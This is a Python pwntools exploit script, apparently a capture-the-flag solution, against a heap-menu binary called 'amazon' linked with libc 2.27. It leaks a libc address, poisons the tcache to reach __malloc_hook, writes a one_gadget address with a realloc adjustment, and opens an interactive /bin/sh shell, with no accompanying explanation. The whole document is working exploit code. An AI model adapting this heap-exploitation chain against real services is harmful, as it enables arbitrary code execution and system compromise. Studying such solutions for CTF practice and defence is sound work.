from pwn import *
context.log_level = 'debug'
context.arch="amd64"

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("choice: ")
	p.sendline(str(command))

def buy(item,many,sz,content):
	cmd(1)
	p.recvuntil("buy: ")
	p.sendline(str(item))
	p.recvuntil("How many: ")
	p.sendline(str(many))
	p.recvuntil("your note: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)
		
def	show():
	cmd(2)
	
def checkout(idx):
	cmd(3)
	p.recvuntil("going to pay for:")
	p.sendline(str(idx))
def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./amazon")
		# debug(0x00000000000128D)
		# gdb.attach(p)
	for i in range(0x17):
		buy(1,1,0x40,"A"*8)
	for i in range(0x17):
		checkout(i)
	# gdb.attach(p)
	for i in range(0x7):
		buy(1,1,0x40,"A"*8)
	
	buy(1,1,0x40,"A"*8)	
	cmd(3)
	p.recvuntil("going to pay for:")
	p.sendline("1"*0x1000)

	buy(1,1,0x50,"A")
	show()
	for i in range(9):
		p.recvuntil("A"*8)
	p.recvuntil("Name: ")
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-0x3ebca0
	success('libc : '+hex(libc.address))
	
	for i in range(0x7):
		buy(1,1,0x40,"A"*8)
	checkout(13)
	buy(1,1,0x100,"A")
	gdb.attach(p)
	buy(1,1,0x100,"\x00"*0xc0+p64(0)+p64(0xe1)+p64(libc.symbols["__malloc_hook"]-0x30))
	buy(1,1,0xa8,"/bin/sh\x00")
	# 0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# rcx == NULL

	# 0x4f322	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# [rsp+0x40] == NULL
	
	# 0x10a38c	execve("/bin/sh", rsp+0x70, environ)
	# constraints:
	# [rsp+0x70] == NULL

	buy(1,1,0xa8,p64(0)+p64(libc.address+0x4f322)+p64(libc.symbols["realloc"]+4))
	cmd(1)
	p.recvuntil("buy: ")
	p.sendline(str(0))
	p.recvuntil("How many: ")
	p.sendline(str(0))
	p.recvuntil("your note: ")
	p.sendline(str(0))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc-2.27.so",checksec=False)
	# elf = ELF("./note_three",checksec=False)
	main(0)